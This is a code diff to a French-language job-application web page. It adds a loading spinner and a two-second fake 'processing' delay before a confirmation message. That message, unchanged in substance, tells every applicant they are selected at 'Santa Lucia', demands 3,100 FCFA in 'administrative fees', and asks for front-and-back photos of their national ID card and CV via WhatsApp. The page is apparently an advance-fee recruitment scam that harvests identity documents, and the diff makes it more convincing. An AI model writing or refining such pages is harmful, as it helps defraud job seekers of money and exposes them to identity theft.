@@ -57,6 +57,10 @@ button:hover {background-color:#ff1493; transform:scale(1.05);}
     line-height:1.6;
 }
 .confirmation h2 {text-align:center; color:#ff1493;}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
 </style>
 </head>
 <body>
@@ -123,15 +127,35 @@ form.addEventListener('submit', function(e) {
     const posteFull = data.get('poste');
     const poste = posteFull.split('(')[0].trim();
 
-    confirmation.innerHTML = `<h2>Félicitations ${prenom} ${nom} !</h2>
-    <p>✅ Votre inscription au poste de <strong>${poste}</strong> chez <strong>Santa Lucia</strong> a été enregistrée avec succès. Nous sommes ravis de vous compter parmi les candidats sélectionnés.</p>
-
-    <p>🚨 Pour finaliser votre dossier, nous vous invitons à régler les frais administratifs de traitement, s’élevant à <strong>3 100 FCFA</strong>. Cette étape est indispensable pour valider définitivement votre candidature .</p>
-
-    <p>🚨 Veuillez nous envoyer dès maintenant une photo recto/verso de votre <strong>CNI</strong> ainsi que votre <strong>CV</strong> via <strong>WhatsApp</strong>. .</p>`;
-
+    // Cache le formulaire
     form.style.display = 'none';
+
+    // Affiche une animation de chargement
+    confirmation.innerHTML = `
+        <div style="text-align:center; font-size:18px;">
+            <div style="
+                border: 6px solid #f3f3f3;
+                border-top: 6px solid #007bff;
+                border-radius: 50%;
+                width: 50px;
+                height: 50px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto 15px auto;
+            "></div>
+            Traitement de votre candidature...
+        </div>
+    `;
     confirmation.style.display = 'block';
+
+    // Après 2 secondes, affiche le message final
+    setTimeout(() => {
+        confirmation.innerHTML = `<h2>Félicitations ${prenom} ${nom} !</h2>
+        <p>✅ Votre inscription au poste de <strong>${poste}</strong> chez <strong>Santa Lucia</strong> a été enregistrée avec succès. Nous sommes ravis de vous compter parmi les candidats sélectionnés.</p>
+
+        <p>🚨 Pour finaliser votre dossier, nous vous invitons à régler les frais administratifs de traitement, s’élevant à <strong>3 100 FCFA</strong>. Cette étape est indispensable pour valider définitivement votre candidature.</p>
+
+        <p>🚨 Veuillez nous envoyer dès maintenant une photo recto/verso de votre <strong>CNI</strong> ainsi que votre <strong>CV</strong> via <strong>WhatsApp</strong>.</p>`;
+    }, 2000);
 
     // Envoi réel à Netlify
     fetch('/', { method: 'POST', body: new URLSearchParams(data) });
